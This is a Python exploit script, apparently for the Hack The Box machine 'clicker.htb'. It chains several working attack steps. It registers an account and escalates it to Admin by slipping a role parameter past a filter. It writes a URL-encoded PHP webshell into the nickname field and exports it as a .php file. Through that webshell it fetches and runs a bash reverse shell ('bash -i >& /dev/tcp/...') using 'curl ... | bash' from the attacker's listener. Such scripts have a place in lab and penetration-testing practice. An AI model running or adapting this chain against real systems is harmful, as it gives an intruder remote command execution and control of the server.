from bs4 import BeautifulSoup
import requests
import sys
import subprocess
import random

if len(sys.argv) < 2:
    print("Usage: python3 poc.py <listener ip> <listener port>")
    sys.exit(1)
 
username = random.randint(100, 100000)
password = random.randint(100, 100000)
url = "http://clicker.htb/"

session = requests.Session()

print("[+] Creating user")
reg = session.post(url + "create_player.php", data={"username": username, "password": password})
print("[+] Username: " + str(username), "Password: " + str(password))

login = session.post(url + "authenticate.php", data={"username": username, "password": password})
print("[+] Gaining admin rights")
admin = session.get(url + "save_game.php/?clicks=1000&level=100&role/**/=Admin")

logout = session.get(url + "logout.php")
login = session.post(url + "authenticate.php", data={"username": username, "password": password})

print("[+] Creating webshell")
nickname = session.get(url + "save_game.php/?clicks=1000&level=100&nickname=%3C%3F%70%68%70%20%73%79%73%74%65%6D%28%24%5F%47%45%54%5B%27%63%6D%64%27%5D%29%20%3F%3E")
export = session.post(url + "export.php", data={"extension": "php"})

response_text = export.text
soup = BeautifulSoup(response_text, 'html.parser')
message_element = soup.find('h5', {'name': 'msg'})
if message_element:
    message_text = message_element.text
    split_result = message_text.split("Data has been saved in ")
    if len(split_result) > 1:
        path = split_result[1]
        print("[+] Webshell path:", path)
    else:
        print("[-] Path not found in the message.")
        print("[-] Error, failed.")
        sys.exit(1)
     
with open('revshell.sh', 'w') as f:
        f.write("#!/bin/bash\n")
        f.write(f"bash -i >& /dev/tcp/{sys.argv[1]}/{sys.argv[2]} 0>&1")
proc = subprocess.Popen(["python3", "-m", "http.server", "8000"])
trigger = requests.get(url + path + f"/?cmd=curl {sys.argv[1]}:8000/revshell.sh | bash")
proc.terminate()
